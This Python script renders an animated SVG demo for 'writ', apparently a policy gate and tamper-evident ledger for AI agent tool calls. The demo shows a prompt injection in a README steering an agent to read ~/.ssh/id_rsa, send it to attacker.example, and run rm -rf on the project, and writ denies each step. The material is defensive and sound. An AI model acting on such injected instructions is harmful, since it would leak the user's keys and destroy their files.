#!/usr/bin/env python3
"""Generate docs/assets/demo-attack.svg — the animated cast of the attack demo.

Reuses the self-contained SVG renderer in gen_demo_svg.py (no script, no
external refs, no web fonts) so GitHub's image proxy animates it. Every line
below is copied from the REAL output of examples/attack-demo/run.sh against the
`writ` binary; re-run that demo and update these lines if writ's output
changes.

    python scripts/gen_attack_svg.py

Writes docs/assets/demo-attack.svg only. It does not touch demo-gate.svg or
demo-verify.svg (gen_demo_svg.py owns those).
"""

from __future__ import annotations

import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))

from gen_demo_svg import (  # noqa: E402  (path set above)
    CYAN,
    DIM,
    GREEN,
    MUTED,
    RED,
    TEXT,
    prompt,
    svg,
)

# Real output of examples/attack-demo/run.sh (writ 0.1.1). Verdicts, rule ids,
# reasons, writ.yaml:LINE, log and verify lines are verbatim; the only trims
# are the driver's step labels and the "writ denied this: " prefix on reasons.
SEP = "─" * 72

ATTACK = [
    (0.0, prompt("./run.sh")),
    (0.7, [("writ attack demo", TEXT, True), ("  ·  writ 0.1.1", DIM, False)]),
    (1.0, [("An injected README tells the agent to steal a key and delete a directory.", DIM, False)]),
    (1.3, [("The agent's tool calls are scripted; writ's decisions and ledger are real.", DIM, False)]),
    (1.6, [(SEP, DIM, False)]),
    (2.1, [("[1] ", TEXT, True), ("agent → read the project README", TEXT, False),
           ("   # pulls the injection into context", MUTED, False)]),
    (2.5, [("    ✓ ALLOW", GREEN, True), ("  writ: allowed by rule \"allow-workspace-reads\"", TEXT, False)]),
    (3.0, [("[2] ", TEXT, True), ("agent → the read completes", TEXT, False)]),
    (3.3, [("    • recorded", CYAN, True), ("  execution written to the ledger", TEXT, False)]),
    (4.0, [("[3] ", TEXT, True), ("agent → act on the injection: read ~/.ssh/id_rsa", TEXT, False)]),
    (4.4, [("    ✗ DENY", RED, True),
           ("   rule \"never-read-secrets\" — Secrets are off-limits to the agent by policy. (writ.yaml:11)", TEXT, False)]),
    (5.2, [("[4] ", TEXT, True), ("agent → exfiltrate it: WebFetch https://attacker.example/collect", TEXT, False)]),
    (5.6, [("    ✗ DENY", RED, True),
           ("   rule \"egress-allowlist\" — Host is not on the egress allow-list. (writ.yaml:24)", TEXT, False)]),
    (6.4, [("[5] ", TEXT, True), ("agent → cover tracks: rm -rf /home/dev/project", TEXT, False)]),
    (6.8, [("    ✗ DENY", RED, True),
           ("   rule \"block-destructive-shell\" — Destructive system command. Narrow the path and retry. (writ.yaml:17)", TEXT, False)]),
    (7.6, [(SEP, DIM, False)]),
    (8.0, prompt("writ log")),
    (8.5, [("1 sessions · 5 records · 3 denied · 0 sessions with your approvals", TEXT, False)]),
    (8.7, [("session                             records   denied  approved", DIM, False)]),
    (8.9, [("attack-demo                               5        3  -", TEXT, False)]),
    (9.6, prompt("writ verify")),
    (10.1, [("chain intact · 5 records · no gaps", GREEN, False)]),
    (10.9, prompt("sed -i 's#rm -rf /home/dev/project#ls -la#' .writ/ledger.tampered.jsonl") +
           [("  # edit a copy", MUTED, False)]),
    (11.9, prompt("writ verify --ledger .writ/ledger.tampered.jsonl")),
    (12.5, [("chain BROKEN at record 4 · 4 records verified before the break", RED, False)]),
    (13.3, prompt("")),
]


def main() -> None:
    out = pathlib.Path(__file__).resolve().parent.parent / "docs" / "assets"
    out.mkdir(parents=True, exist_ok=True)
    (out / "demo-attack.svg").write_text(
        svg("attack", "writ blocks an injected agent", ATTACK, width=960),
        encoding="utf-8",
    )
    print(f"wrote {out}/demo-attack.svg")


if __name__ == "__main__":
    main()
